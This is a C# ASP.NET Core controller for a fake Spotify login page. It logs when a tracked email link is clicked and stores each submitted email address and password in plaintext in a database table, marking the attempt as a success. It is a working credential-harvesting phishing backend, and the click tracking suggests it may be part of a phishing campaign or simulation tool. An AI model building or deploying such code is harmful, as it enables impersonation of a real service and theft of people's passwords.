
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using WebApplicationProject.Models;


namespace WebApplicationProject.Controllers
{
    public class SpotifyLoginController : Controller
    {
        private readonly WebDatabaseContext _context;
        private readonly ILogger<SpotifyLoginController> _logger;

        public SpotifyLoginController(WebDatabaseContext context, ILogger<SpotifyLoginController> logger)
        {
            _context = context;
            _logger = logger;
        }
        public IActionResult Page()
        {
            return View("~/Views/SpotifyLogin/SpotifyLogin.cshtml");
        }
        public IActionResult Index(int EmailId)
        {
            ViewBag.EmailId = EmailId;


            var existingClickedMail = _context.ClickedMails.FirstOrDefault(a => a.EmailId == EmailId);
            if (existingClickedMail == null) // Eğer böyle bir kayıt yoksa ekleme işlemi yap
            {
                var clicked = new ClickedMail
                {
                    EmailId = EmailId,
                    Date = DateTime.Now,
                    Success = false
                };
                _context.Add(clicked);
                _context.SaveChanges();
            }
            return View("~/Views/SpotifyLogin/SpotifyLogin.cshtml");
        }


        [HttpPost]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> PostLogin(string Email, string Password,int EmailId)
        {
            if (!string.IsNullOrEmpty(Email) && !string.IsNullOrEmpty(Password))
            {
                // Veritabanına ekleme işlemi
                var SpotifyLogin = new SpotifyLogin
                {
                    Email = Email, 
                    Password = Password 
                };
                var clickedMail = _context.ClickedMails.FirstOrDefault(a => a.EmailId == EmailId);
                clickedMail.Success = true;
                _context.Add(SpotifyLogin);
                await _context.SaveChangesAsync();
                _context.Update(clickedMail);

                return View("Index");
            }

            return BadRequest(); // Hata durumunda bad request dönebilirsiniz
        }

    }
}

